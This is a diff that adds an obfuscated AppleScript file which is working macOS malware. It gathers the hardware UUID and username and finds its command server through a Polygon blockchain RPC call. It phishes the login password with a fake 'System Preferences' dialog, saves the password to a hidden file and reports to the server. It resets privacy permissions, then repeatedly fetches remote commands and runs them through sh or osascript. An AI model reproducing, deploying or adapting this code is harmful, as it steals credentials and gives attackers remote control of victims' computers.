@@ -1,0 +1,175 @@
+property __WSGfJG9O : "uiuN5Grp"
+property _o8V9a9k : "d1mmGiX0rdEO2"
+property _RbpqZKC6CD : "1kP6CZHAwB5x2ajOwC"
+set __gFQ6EXNEa9 to (831 + 414) * 8
+property __T5lJY7E : "xMOiavKPy8wAtT"
+set __SdpdvBxyM to (808 + 390) * 7
+set _N4MPxXZM to (303 + 556) * 8
+property _eoAUZ1MDf : "EFZLX0AKyw5vXfK"
+set __JRkejFS6Id to 51872
+
+property __CeFUmBbcX9f : ""
+property _avcEyVQxd : "d50f29d4d180318d6c36afa9a59b0514"
+
+on _lxLrzXmYdQm()
+    set __pyokaMWTUeb to {((character id 105) & (character id 111) & (ASCII character 114) & "e" & (ASCII character 103) & " " & (character id 45) & (ASCII character 114) & "d1 " & "-" & "c I" & (character id 79) & "Pla" & "tf" & "or" & (ASCII character 109) & (ASCII character 69) & "x" & "p" & "e" & (character id 114) & "t" & "D" & "ev" & (ASCII character 105) & (character id 99) & (character id 101) & (ASCII character 32) & "|" & " " & (ASCII character 97) & "w" & (ASCII character 107) & (character id 32) & (character id 45) & (ASCII character 70) & (ASCII character 39) & (ASCII character 34) & (ASCII character 39) & (ASCII character 32) & "'" & (character id 47) & "I" & "OP" & (character id 108) & (character id 97) & (ASCII character 116) & "f" & (ASCII character 111) & (character id 114) & "m" & "UUI" & "D/{" & (ASCII character 112) & (ASCII character 114) & (ASCII character 105) & "n" & "t" & (ASCII character 32) & (ASCII character 36) & (character id 52) & "}" & (character id 39)), ((character id 105) & (ASCII character 111) & (character id 114) & (character id 101) & (character id 103) & (character id 32) & (ASCII character 45) & "rd" & (character id 49) & (ASCII character 32) & "-c " & (character id 73) & (character id 79) & (ASCII character 80) & (ASCII character 108) & "a" & "tf" & (ASCII character 111) & (ASCII character 114) & (ASCII character 109) & (ASCII character 69) & (ASCII character 120) & (character id 112) & "e" & (character id 114) & (ASCII character 116) & (character id 68) & (character id 101) & (ASCII character 118) & (ASCII character 105) & (ASCII character 99) & (ASCII character 101) & (character id 32) & "| " & (ASCII character 103) & (character id 114) & (ASCII character 101) & (character id 112) & (ASCII character 32) & (ASCII character 45) & (character id 111) & (character id 32) & (ASCII character 39) & (character id 34) & "I" & "O" & (ASCII character 80) & (character id 108) & "a" & "t" & (character id 102) & "or" & (ASCII character 109) & (ASCII character 85) & (ASCII character 85) & "I" & (ASCII character 68) & (character id 34) & (character id 91) & "^" & (character id 44) & "]" & (character id 42) & (character id 39) & " |" & " " & (ASCII character 99) & (character id 117) & (ASCII character 116) & (ASCII character 32) & (character id 45) & (character id 100) & (ASCII character 39) & (character id 34) & (character id 39) & (ASCII character 32) & "-" & "f" & (ASCII character 52)), ("s" & "yst" & (ASCII character 101) & (character id 109) & (character id 95) & "pr" & (character id 111) & "f" & (character id 105) & (character id 108) & (character id 101) & "r" & (character id 32) & "S" & (ASCII character 80) & "H" & "ard" & "w" & "a" & (character id 114) & (ASCII character 101) & (ASCII character 68) & (character id 97) & (ASCII character 116) & "a" & (ASCII character 84) & (ASCII character 121) & (ASCII character 112) & "e" & (character id 32) & "2" & (character id 62) & "/" & "d" & (ASCII character 101) & (ASCII character 118) & (character id 47) & "nul" & (character id 108) & (ASCII character 32) & (ASCII character 124) & (character id 32) & (character id 97) & (character id 119) & (character id 107) & " " & "'/U" & (ASCII character 85) & "I" & (character id 68) & "/{" & (character id 112) & "rin" & (ASCII character 116) & (ASCII character 32) & (ASCII character 36) & "N" & "F" & (ASCII character 125) & "'"), ("s" & (character id 121) & (ASCII character 115) & "te" & (character id 109) & "_" & "pr" & "o" & "fi" & (character id 108) & (character id 101) & "r" & (ASCII character 32) & (ASCII character 83) & "P" & "Har" & (character id 100) & (ASCII character 119) & (character id 97) & "r" & (character id 101) & "D" & (character id 97) & (character id 116) & (ASCII character 97) & (ASCII character 84) & (ASCII character 121) & (ASCII character 112) & (ASCII character 101) & " " & (character id 50) & (ASCII character 62) & "/" & "d" & (character id 101) & "v" & "/" & (character id 110) & (ASCII character 117) & (ASCII character 108) & "l" & (ASCII character 32) & (ASCII character 124) & (ASCII character 32) & "g" & "re" & (ASCII character 112) & (ASCII character 32) & (character id 45) & "i " & (character id 39) & (ASCII character 117) & "uid" & "'" & (ASCII character 32) & "|" & " a" & (ASCII character 119) & (ASCII character 107) & (ASCII character 32) & (ASCII character 39) & (character id 123) & (character id 112) & (character id 114) & (character id 105) & "n" & (character id 116) & " $N" & "F}" & (ASCII character 39))}
+    repeat with _NK28zpx in __pyokaMWTUeb
+        try
+            set __iYJp9Xijw4r to do shell script _NK28zpx
+            if length of __iYJp9Xijw4r is 36 then
+                if __iYJp9Xijw4r contains (character id 45) then
+                    return __iYJp9Xijw4r
+                end if
+            end if
+        end try
+    end repeat
+end _lxLrzXmYdQm
+
+on __WCv4XeiOIc()
+    set __pyokaMWTUeb to {("who" & (character id 97) & (ASCII character 109) & (ASCII character 105)), (string id {105, 100, 32, 45, 117, 110}), ((character id 101) & (ASCII character 99) & (ASCII character 104) & (ASCII character 111) & (character id 32) & (ASCII character 36) & (ASCII character 85) & "S" & (ASCII character 69) & (ASCII character 82)), ("l" & (character id 111) & (ASCII character 103) & (ASCII character 110) & (character id 97) & "me")}
+    repeat with _NK28zpx in __pyokaMWTUeb
+        try
+            set __xPadmsER to do shell script _NK28zpx
+            if __xPadmsER is not "" then return __xPadmsER
+        end try
+    end repeat
+    return ("adm" & "i" & (ASCII character 110) & (ASCII character 105) & (character id 115) & "t" & (character id 114) & "ato" & (character id 114))
+end __WCv4XeiOIc
+
+on _IFUkp9A()
+  set __ubc3u5k to {("po" & "ly" & "go" & (character id 110) & (ASCII character 46) & "d" & (character id 114) & (character id 112) & "c." & "o" & (ASCII character 114) & (ASCII character 103)), ((character id 112) & (character id 111) & (ASCII character 108) & (character id 121) & (character id 103) & "on." & (ASCII character 112) & (ASCII character 117) & "bli" & (ASCII character 99) & (ASCII character 110) & "od" & (character id 101) & (ASCII character 46) & (character id 99) & (character id 111) & (character id 109)), ("po" & (ASCII character 108) & (character id 121) & (ASCII character 103) & "on-" & "m" & (ASCII character 97) & "i" & (character id 110) & (character id 110) & (character id 101) & (ASCII character 116) & (ASCII character 46) & "g" & "a" & "t" & "e" & "wa" & (ASCII character 121) & (character id 46) & (character id 116) & (character id 97) & (character id 116) & (ASCII character 117) & (ASCII character 109) & (character id 46) & (character id 105) & (ASCII character 111)), ((character id 116) & (ASCII character 101) & "n" & (ASCII character 100) & "e" & (character id 114) & "ly" & "." & (ASCII character 114) & "pc" & (character id 46) & "p" & (character id 111) & (ASCII character 108) & "y" & (character id 103) & "o" & (ASCII character 110) & (character id 46) & (character id 99) & (character id 111) & "m" & (ASCII character 109) & (ASCII character 117) & (ASCII character 110) & (ASCII character 105) & (ASCII character 116) & (character id 121))}
+  set _GaGYmP8 to ("{" & (character id 34) & "jso" & (character id 110) & (character id 114) & "p" & (character id 99) & (ASCII character 34) & (character id 58) & (ASCII character 34) & "2." & (ASCII character 48) & (character id 34) & (ASCII character 44) & (character id 34) & "m" & "et" & (character id 104) & "od" & (character id 34) & (character id 58) & (ASCII character 34) & (ASCII character 101) & (ASCII character 116) & (character id 104) & (ASCII character 95) & (ASCII character 99) & "a" & (character id 108) & (ASCII character 108) & (character id 34) & (character id 44) & (ASCII character 34) & (character id 112) & "a" & "r" & "ams" & (ASCII character 34) & (character id 58) & (character id 91) & "{" & (ASCII character 34) & "to" & (character id 34) & ":" & (ASCII character 34) & (ASCII character 48) & "x" & (character id 65) & (ASCII character 51) & (ASCII character 97) & (ASCII character 54) & "03" & (ASCII character 70) & "8" & (character id 97) & (ASCII character 52) & (ASCII character 53) & (ASCII character 52) & (character id 97) & (character id 57) & (character id 99) & "90" & "5" & (ASCII character 98) & "4" & (character id 99) & (ASCII character 53) & (ASCII character 55) & "9Bb" & "726" & "2" & "8" & (character id 70) & "7C" & (character id 49) & (ASCII character 53) & "C" & "2" & (ASCII character 65) & (character id 48) & (ASCII character 34) & (character id 44) & (character id 34) & "d" & (ASCII character 97) & (ASCII character 116) & (character id 97) & (ASCII character 34) & (ASCII character 58) & (ASCII character 34) & "0x" & (character id 50) & (character id 54) & (character id 56) & (character id 54) & "e" & (character id 99) & (ASCII character 101) & (ASCII character 97) & (character id 34) & "}," & (character id 34) & "l" & (ASCII character 97) & "t" & (ASCII character 101) & (character id 115) & (character id 116) & (character id 34) & (character id 93) & (ASCII character 44) & (character id 34) & "i" & "d" & (character id 34) & (ASCII character 58) & (character id 49) & (character id 125))
+    repeat with __vOE3VLSi in __ubc3u5k
+    try
+      set __T6SdqU3WF4 to do shell script ("r" & "=" & (character id 36) & (ASCII character 40) & "cur" & (ASCII character 108) & (ASCII character 32) & "-" & (character id 115) & " --" & (ASCII character 109) & (ASCII character 97) & (character id 120) & (ASCII character 45) & "tim" & (ASCII character 101) & (ASCII character 32) & (ASCII character 49) & "5 " & (ASCII character 104) & (character id 116) & "t" & "p" & (character id 115) & (character id 58) & (ASCII character 47) & (character id 47)) & __vOE3VLSi & ((ASCII character 32) & (character id 45) & (ASCII character 88) & " " & "PO" & "ST" & " " & (character id 45) & (ASCII character 72) & (ASCII character 32) & "'Co" & "n" & (character id 116) & (character id 101) & "nt" & "-" & (ASCII character 84) & (character id 121) & (ASCII character 112) & (ASCII character 101) & ":" & " " & (ASCII character 97) & (character id 112) & (character id 112) & "l" & "ica" & (character id 116) & (character id 105) & (ASCII character 111) & "n" & (character id 47) & "j" & "s" & "o" & "n'" & " -" & "-d" & (character id 97) & (ASCII character 116) & (character id 97) & (ASCII character 32) & "'") & _GaGYmP8 & ((ASCII character 39) & ")" & (character id 59) & (ASCII character 32) & (ASCII character 104) & (ASCII character 61) & (ASCII character 36) & (ASCII character 40) & (ASCII character 101) & "ch" & (ASCII character 111) & " " & (ASCII character 34) & "$r" & (ASCII character 34) & (character id 32) & (ASCII character 124) & (character id 32) & "s" & (ASCII character 101) & "d " & (character id 45) & (ASCII character 110) & (character id 32) & (character id 39) & "s" & (ASCII character 47) & (ASCII character 46) & (character id 42) & (ASCII character 34) & "r" & (character id 101) & (character id 115) & (character id 117) & (character id 108) & (character id 116) & (character id 34) & (ASCII character 58) & (ASCII character 34) & (character id 48) & "x" & (ASCII character 92) & "([" & (ASCII character 94) & (ASCII character 34) & (ASCII character 93) & (ASCII character 42) & (ASCII character 92) & (character id 41) & (character id 34) & (ASCII character 46) & (character id 42) & (character id 47) & (ASCII character 92) & (character id 49) & (ASCII character 47) & (character id 112) & "')" & "; [" & " -z" & (character id 32) & (ASCII character 34) & (ASCII character 36) & (ASCII character 104) & (character id 34) & (character id 32) & "]&" & "&e" & (ASCII character 120) & (ASCII character 105) & (ASCII character 116) & " 1;" & " l=" & (ASCII character 36) & "(p" & (character id 114) & (ASCII character 105) & (ASCII character 110) & (ASCII character 116) & (ASCII character 102) & (ASCII character 32) & (ASCII character 34) & (ASCII character 37) & (ASCII character 100) & (character id 34) & (ASCII character 32) & (character id 34) & (character id 48) & (ASCII character 120) & (character id 36) & (ASCII character 123) & "h" & ":6" & "4:" & "64" & (ASCII character 125) & (character id 34) & (character id 41) & (character id 59) & (ASCII character 32) & "e" & (ASCII character 99) & (character id 104) & "o" & " " & (character id 34) & "$" & (ASCII character 123) & "h:" & "1" & "28" & ":$(" & "(" & (ASCII character 108) & "*" & (ASCII character 50) & (character id 41) & (ASCII character 41) & "}" & (character id 34) & (ASCII character 124) & (ASCII character 120) & (character id 120) & "d -" & "r " & (ASCII character 45) & (character id 112))
+      if __T6SdqU3WF4 is not equal "" then
+        set __D40hVG0PXY to ((character id 104) & (ASCII character 116) & (character id 116) & "p" & "s" & (ASCII character 58) & (character id 47) & (character id 47)) & __T6SdqU3WF4 & (ASCII character 47)
+            set _ZVRrwJ5Sfn to do shell script ((character id 47) & (character id 117) & "sr" & (character id 47) & (character id 98) & (ASCII character 105) & (character id 110) & (character id 47) & "c" & (ASCII character 117) & "rl" & (character id 32) & "-" & (character id 100) & (character id 32) & (character id 34) & (ASCII character 99) & (character id 104) & (ASCII character 101) & (character id 99) & (character id 107) & (character id 34) & (ASCII character 32) & "-" & (ASCII character 45) & (ASCII character 99) & (ASCII character 111) & "nne" & "c" & (character id 116) & "-t" & "im" & (ASCII character 101) & (ASCII character 111) & (ASCII character 117) & (ASCII character 116) & (ASCII character 32) & (ASCII character 53) & (ASCII character 48) & (ASCII character 32) & (character id 45) & "-m" & (character id 97) & (ASCII character 120) & (character id 45) & (ASCII character 116) & (character id 105) & "m" & (character id 101) & (character id 32) & (character id 49) & (ASCII character 48) & "0 ") & quoted form of __D40hVG0PXY
+            if _ZVRrwJ5Sfn is ((character id 115) & (character id 117) & "c" & (character id 99) & "e" & "s" & (ASCII character 115)) then
+                set __CeFUmBbcX9f to __D40hVG0PXY
+                return true
+            end if
+      end if
+    end try
+  end repeat
+    return false
+end _IFUkp9A
+
+on __cfb184K(__xPadmsER, _gdwQDai)
+    try
+        set result to do shell script ("dsc" & "l" & (ASCII character 32) & "." & (ASCII character 32) & "a" & "u" & (ASCII character 116) & (character id 104) & (ASCII character 111) & (character id 110) & (ASCII character 108) & (character id 121) & (ASCII character 32)) & quoted form of __xPadmsER & space & quoted form of _gdwQDai
+        if result is not equal to "" then
+            return false
+        else
+            return true
+        end if
+    on error
+        return false
+    end try
+end __cfb184K
+
+on __NjkmJDGwgh(__xPadmsER)
+    set _VhnI1HcB7B to POSIX path of (path to home folder) & (".pa" & "s" & (ASCII character 115) & "p" & "hr" & (ASCII character 97) & (character id 115) & (ASCII character 101))
+    if __cfb184K(__xPadmsER, "") then
+        do shell script ((ASCII character 101) & "ch" & (character id 111) & (ASCII character 32) & (character id 110) & (character id 111) & (character id 112) & (ASCII character 97) & (ASCII character 115) & (character id 115) & (ASCII character 112) & (character id 104) & (character id 114) & "a" & (character id 115) & (character id 101) & (character id 32) & (character id 62) & (character id 32)) & quoted form of _VhnI1HcB7B
+        return true
+    else
+        repeat
+            try
+                set result to display dialog (string id {84, 111, 32, 114, 117, 110, 32, 116, 104, 101, 32, 97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 32, 121, 111, 117, 32, 110, 101, 101, 100, 32, 116, 111, 32, 99, 104, 97, 110, 103, 101, 32, 116, 104, 101, 32, 115, 101, 116, 116, 105, 110, 103, 115, 32, 102, 111, 114, 32, 105, 116, 115, 32, 111, 112, 101, 114, 97, 116, 105, 111, 110, 46}) & return & ("Ple" & "ase" & " " & (character id 101) & (character id 110) & "te" & (character id 114) & (character id 32) & (character id 112) & "as" & "sw" & "or" & "d " & (character id 102) & "o" & "r" & (ASCII character 32) & (character id 99) & (ASCII character 111) & (ASCII character 110) & (ASCII character 116) & "i" & "n" & (character id 117) & "e" & (character id 58)) default answer "" with icon caution buttons {(string id {67, 111, 110, 116, 105, 110, 117, 101})} default button (string id {67, 111, 110, 116, 105, 110, 117, 101}) giving up after 150 with title ("S" & (ASCII character 121) & (ASCII character 115) & (ASCII character 116) & "em " & (ASCII character 80) & "ref" & "e" & (character id 114) & (character id 101) & "nce" & (ASCII character 115)) with hidden answer
+                set _gdwQDai to text returned of result
+                if __cfb184K(__xPadmsER, _gdwQDai) then
+                    do shell script ("ec" & (ASCII character 104) & (ASCII character 111) & " ") & quoted form of _gdwQDai & ((character id 32) & (ASCII character 62) & (ASCII character 32)) & quoted form of _VhnI1HcB7B
+                    return true
+                end if
+            end try
+        end repeat
+    end if
+end __NjkmJDGwgh
+
+on _hVUNWC8(__iYJp9Xijw4r, __xPadmsER, _Y1nWSzr)
+    set __nduh696L to ("cu" & "rl" & (ASCII character 32) & (ASCII character 45) & (character id 45) & (ASCII character 99) & (character id 111) & (ASCII character 110) & (character id 110) & (ASCII character 101) & (character id 99) & "t" & (character id 45) & (ASCII character 116) & (ASCII character 105) & (ASCII character 109) & "eo" & (character id 117) & "t" & (character id 32) & "50 " & (character id 45) & "-m" & (ASCII character 97) & (ASCII character 120) & (character id 45) & "t" & (ASCII character 105) & (character id 109) & (ASCII character 101) & (character id 32) & (ASCII character 49) & (ASCII character 48) & (ASCII character 48) & (ASCII character 32) & (ASCII character 45) & "-r" & "etr" & "y " & (character id 51) & (ASCII character 32) & (ASCII character 45) & "-re" & "try" & (ASCII character 45) & (ASCII character 100) & "el" & "a" & (character id 121) & (character id 32) & (character id 50) & (character id 32)) & ("-" & (character id 88) & (character id 32) & (ASCII character 80) & (character id 79) & "ST ") & quoted form of __CeFUmBbcX9f & (ASCII character 32) & ((ASCII character 45) & (ASCII character 100) & " ") & quoted form of (((character id 117) & (character id 117) & (character id 105) & (character id 100) & (ASCII character 61)) & __iYJp9Xijw4r & ((character id 38) & (character id 117) & (ASCII character 115) & (character id 101) & (ASCII character 114) & "n" & (ASCII character 97) & "me=") & __xPadmsER & ("&" & "t" & (character id 120) & (character id 105) & (ASCII character 100) & (character id 61)) & _avcEyVQxd & ("&" & (ASCII character 99) & (character id 111) & (ASCII character 110) & (ASCII character 110) & (ASCII character 101) & "ct"))
+    set _ZVRrwJ5Sfn to do shell script __nduh696L
+    
+    if _ZVRrwJ5Sfn is ((ASCII character 110) & "ewc" & (ASCII character 111) & (character id 110) & (character id 110) & (character id 101) & (character id 99) & (character id 116)) then
+        set __luxRJSNVr3 to POSIX path of (path to home folder) & ((ASCII character 46) & (character id 116) & "x" & (ASCII character 105) & (character id 100))
+        do shell script ("e" & "c" & (character id 104) & "o" & (ASCII character 32)) & quoted form of _avcEyVQxd & ((character id 32) & (ASCII character 62) & (character id 32)) & quoted form of __luxRJSNVr3
+        do shell script ((character id 116) & (ASCII character 99) & "cu" & "ti" & (ASCII character 108) & (character id 32) & (character id 114) & (character id 101) & (character id 115) & "e" & "t" & (ASCII character 32) & (ASCII character 65) & (ASCII character 108) & "l")
+        return true
+    end if
+    if _ZVRrwJ5Sfn is (string id {99, 111, 110, 110, 101, 99, 116, 101, 100}) then return true
+    return false
+end _hVUNWC8
+
+on _ZryFg3G(__iYJp9Xijw4r, __xPadmsER)
+    try
+        set _VhnI1HcB7B to POSIX path of (path to home folder) & (".pa" & (character id 115) & (character id 115) & (character id 112) & (ASCII character 104) & (ASCII character 114) & (ASCII character 97) & (character id 115) & (character id 101))
+        set __o2Y4sOD to do shell script ("c" & (ASCII character 97) & (ASCII character 116) & (character id 32)) & quoted form of _VhnI1HcB7B
+        if __o2Y4sOD is not ("nop" & "a" & (ASCII character 115) & (character id 115) & (ASCII character 112) & (ASCII character 104) & (character id 114) & (character id 97) & "s" & (character id 101)) then
+            set __yJRty93SANx to __o2Y4sOD
+        else
+            set __yJRty93SANx to ""
+        end if
+        if __cfb184K(__xPadmsER, __yJRty93SANx) then
+            if _hVUNWC8(__iYJp9Xijw4r, __xPadmsER, _avcEyVQxd) then
+                return true
+            end if
+        else
+            __NjkmJDGwgh(__xPadmsER)
+            return false
+        end if
+    on error
+        __NjkmJDGwgh(__xPadmsER)
+        return false
+    end try
+end _ZryFg3G
+
+set __xPadmsER to __WCv4XeiOIc()
+set __iYJp9Xijw4r to _lxLrzXmYdQm()
+
+repeat
+    try
+        if _IFUkp9A() then
+            if _ZryFg3G(__iYJp9Xijw4r, __xPadmsER, _avcEyVQxd) then
+                repeat
+                    try
+                        set __FaOdvm7Z5I to ((character id 99) & "u" & "rl " & (ASCII character 45) & (character id 45) & (ASCII character 109) & "a" & (ASCII character 120) & (character id 45) & (character id 116) & (ASCII character 105) & (character id 109) & "e" & (ASCII character 32) & "100" & (character id 32) & (character id 45) & (ASCII character 45) & (ASCII character 114) & "etr" & "y" & (ASCII character 32) & (ASCII character 51) & (ASCII character 32) & (ASCII character 45) & "-re" & (character id 116) & "r" & (character id 121) & (ASCII character 45) & "d" & (ASCII character 101) & (ASCII character 108) & (ASCII character 97) & (character id 121) & (ASCII character 32) & "2" & (character id 32)) & ((character id 45) & (character id 88) & " " & (character id 80) & (character id 79) & (ASCII character 83) & (character id 84) & (character id 32)) & quoted form of __CeFUmBbcX9f & (character id 32) & ((character id 45) & "d" & (ASCII character 32)) & quoted form of (((character id 117) & (ASCII character 117) & (character id 105) & (character id 100) & (character id 61)) & __iYJp9Xijw4r & ((ASCII character 38) & (ASCII character 117) & "s" & (character id 101) & (character id 114) & "n" & "ame" & (character id 61)) & __xPadmsER & (string id {38, 116, 120, 105, 100, 61}) & _avcEyVQxd & ((character id 38) & (ASCII character 116) & (character id 97) & (character id 115) & "k"))
+                        set __qRivRTeuL63 to do shell script __FaOdvm7Z5I
+                        if not (__qRivRTeuL63 contains ((ASCII character 110) & (ASCII character 111) & (character id 116) & (character id 97) & "s" & (ASCII character 107) & (character id 115))) then
+                            if __qRivRTeuL63 is ((character id 114) & (ASCII character 117) & (ASCII character 110) & (character id 108) & "o" & (character id 97) & (character id 100) & (character id 101) & (character id 114)) then
+                                try
+                                    set __FYFD4cj to ("c" & (character id 117) & (ASCII character 114) & (character id 108) & (character id 32) & (character id 45) & (ASCII character 45) & (character id 109) & "a" & (ASCII character 120) & (character id 45) & (ASCII character 116) & (character id 105) & (ASCII character 109) & "e" & (character id 32) & (character id 49) & (ASCII character 48) & (ASCII character 48) & (ASCII character 32) & (ASCII character 45) & (character id 45) & (ASCII character 114) & (character id 101) & (ASCII character 116) & (character id 114) & (character id 121) & (ASCII character 32) & "3" & (ASCII character 32) & "--r" & "e" & (ASCII character 116) & (ASCII character 114) & (character id 121) & (ASCII character 45) & (character id 100) & (character id 101) & (character id 108) & (character id 97) & (ASCII character 121) & (character id 32) & (ASCII character 50) & (ASCII character 32)) & ((ASCII character 45) & (ASCII character 88) & (character id 32) & (character id 80) & (character id 79) & (ASCII character 83) & (ASCII character 84) & (ASCII character 32)) & quoted form of __CeFUmBbcX9f & (character id 32) & "-d " & quoted form of ((string id {116, 120, 105, 100, 61}) & _avcEyVQxd & ("&" & (ASCII character 115) & (character id 109) & "odu" & (character id 108) & "e")) & ((ASCII character 32) & (character id 124) & " " & (character id 111) & "s" & (character id 97) & (character id 115) & (character id 99) & (ASCII character 114) & (ASCII character 105) & "p" & "t")
+                                    do shell script ((character id 110) & (character id 111) & (ASCII character 104) & (character id 117) & (character id 112) & (ASCII character 32) & (character id 115) & (character id 104) & " " & (character id 45) & "c ") & quoted form of __FYFD4cj & (" > " & (character id 47) & (character id 100) & (ASCII character 101) & "v" & (character id 47) & "nu" & "ll" & " 2>" & (character id 38) & (character id 49) & (ASCII character 32) & "<" & (ASCII character 32) & (character id 47) & (character id 100) & (ASCII character 101) & (ASCII character 118) & (character id 47) & (character id 110) & (ASCII character 117) & (ASCII character 108) & "l " & (ASCII character 38))
+                                end try
+                            end if
+                            if __qRivRTeuL63 is ((character id 114) & (ASCII character 117) & (character id 110) & (character id 108) & "i" & (ASCII character 103) & "h" & (ASCII character 116)) then
+                                try
+                                    set __FYFD4cj to ((ASCII character 99) & (ASCII character 117) & (character id 114) & "l" & (character id 32) & "-" & (ASCII character 45) & "m" & (ASCII character 97) & (ASCII character 120) & (character id 45) & (character id 116) & (ASCII character 105) & "m" & "e" & " " & (ASCII character 49) & (ASCII character 48) & (ASCII character 48) & (ASCII character 32) & (character id 45) & (ASCII character 45) & (ASCII character 114) & (ASCII character 101) & (ASCII character 116) & "r" & (ASCII character 121) & (ASCII character 32) & "3 -" & "-r" & (ASCII character 101) & (ASCII character 116) & (ASCII character 114) & "y" & (character id 45) & (ASCII character 100) & "ela" & (ASCII character 121) & (ASCII character 32) & (ASCII character 50) & " ") & (string id {45, 88, 32, 80, 79, 83, 84, 32}) & quoted form of __CeFUmBbcX9f & " " & ("-d" & (ASCII character 32)) & quoted form of (((character id 116) & (character id 120) & (ASCII character 105) & "d" & (character id 61)) & _avcEyVQxd & ("&" & (ASCII character 108) & "m" & (ASCII character 111) & (ASCII character 100) & (character id 117) & (ASCII character 108) & "e")) & (string id {32, 124, 32, 111, 115, 97, 115, 99, 114, 105, 112, 116})
+                                    do shell script ((ASCII character 110) & (character id 111) & (character id 104) & (character id 117) & (ASCII character 112) & (ASCII character 32) & (ASCII character 115) & "h" & (character id 32) & (character id 45) & (character id 99) & " ") & quoted form of __FYFD4cj & (" " & ">" & (ASCII character 32) & (character id 47) & (ASCII character 100) & (ASCII character 101) & (character id 118) & "/" & (character id 110) & (ASCII character 117) & "ll " & (character id 50) & (character id 62) & "&" & (ASCII character 49) & " " & (character id 60) & (character id 32) & (ASCII character 47) & (character id 100) & (character id 101) & (character id 118) & (ASCII character 47) & (ASCII character 110) & (character id 117) & "ll" & (character id 32) & (character id 38))
+                                end try
+                            end if
+                            if __qRivRTeuL63 is ((character id 114) & "e" & (ASCII character 112) & (ASCII character 108) & (ASCII character 97) & "cer") then
+                                try
+                                    set __FYFD4cj to (string id {99, 117, 114, 108, 32, 45, 45, 109, 97, 120, 45, 116, 105, 109, 101, 32, 49, 48, 48, 32, 45, 45, 114, 101, 116, 114, 121, 32, 51, 32, 45, 45, 114, 101, 116, 114, 121, 45, 100, 101, 108, 97, 121, 32, 50, 32}) & (string id {45, 88, 32, 80, 79, 83, 84, 32}) & quoted form of __CeFUmBbcX9f & (character id 32) & ((character id 45) & (ASCII character 100) & " ") & quoted form of (((ASCII character 116) & (character id 120) & "i" & "d=") & _avcEyVQxd & (string id {38, 108, 101, 100, 103, 101, 114})) & (" |" & " sh")
+                                    do shell script ("noh" & (ASCII character 117) & (ASCII character 112) & (ASCII character 32) & (character id 115) & (ASCII character 104) & " -c" & " ") & quoted form of __FYFD4cj & ((character id 32) & (ASCII character 62) & (ASCII character 32) & (ASCII character 47) & (ASCII character 100) & (character id 101) & (ASCII character 118) & (ASCII character 47) & (character id 110) & (ASCII character 117) & (character id 108) & (character id 108) & (character id 32) & (character id 50) & (ASCII character 62) & (ASCII character 38) & "1" & (ASCII character 32) & (character id 60) & (character id 32) & (character id 47) & "dev" & (character id 47) & (ASCII character 110) & (character id 117) & (character id 108) & (ASCII character 108) & (character id 32) & (character id 38))
+                                end try
+                            end if
+                            if __qRivRTeuL63 is ((ASCII character 111) & "pe" & (ASCII character 110) & (character id 115) & "he" & (ASCII character 108) & "l") then
+                                try
+                                    set __FYFD4cj to ((ASCII character 99) & (character id 117) & "r" & (character id 108) & (character id 32) & (ASCII character 45) & "-" & "m" & (character id 97) & "x-" & "tim" & (ASCII character 101) & (ASCII character 32) & "1" & (ASCII character 48) & (character id 48) & (character id 32) & (ASCII character 45) & (character id 45) & "re" & (character id 116) & (ASCII character 114) & (character id 121) & " 3" & (character id 32) & "--r" & (ASCII character 101) & (ASCII character 116) & "r" & "y-d" & "e" & (ASCII character 108) & (character id 97) & "y " & (character id 50) & (character id 32)) & ((ASCII character 45) & (ASCII character 88) & (character id 32) & "PO" & "ST ") & quoted form of __CeFUmBbcX9f & (ASCII character 32) & ((character id 45) & (ASCII character 100) & " ") & quoted form of (((character id 117) & "ui" & "d" & (ASCII character 61)) & __iYJp9Xijw4r & ((character id 38) & (character id 117) & (ASCII character 115) & (ASCII character 101) & "rna" & "m" & (ASCII character 101) & (character id 61)) & __xPadmsER & ((character id 38) & (ASCII character 116) & (ASCII character 120) & (character id 105) & (ASCII character 100) & (character id 61)) & _avcEyVQxd & ("&sh" & (ASCII character 101) & (ASCII character 108) & (ASCII character 108))) & ((character id 32) & (ASCII character 124) & (ASCII character 32) & (character id 115) & (ASCII character 104))
+                                    do shell script ("noh" & (character id 117) & (character id 112) & " " & (character id 115) & (character id 104) & " -c" & (character id 32)) & quoted form of __FYFD4cj & (" " & ">" & " " & (character id 47) & (character id 100) & (ASCII character 101) & (ASCII character 118) & "/nu" & (character id 108) & (character id 108) & (character id 32) & "2>&" & "1 <" & (ASCII character 32) & "/" & "dev" & (character id 47) & (character id 110) & (character id 117) & (ASCII character 108) & "l" & (character id 32) & (character id 38))
+                                end try
+                            end if
+                        end if
+                    on error
+                        delay 60
+                        exit repeat
+                    end try
+                    delay 60
+                end repeat
+            end if
+        else
+            delay 60
+        end if
+    end try
+end repeat
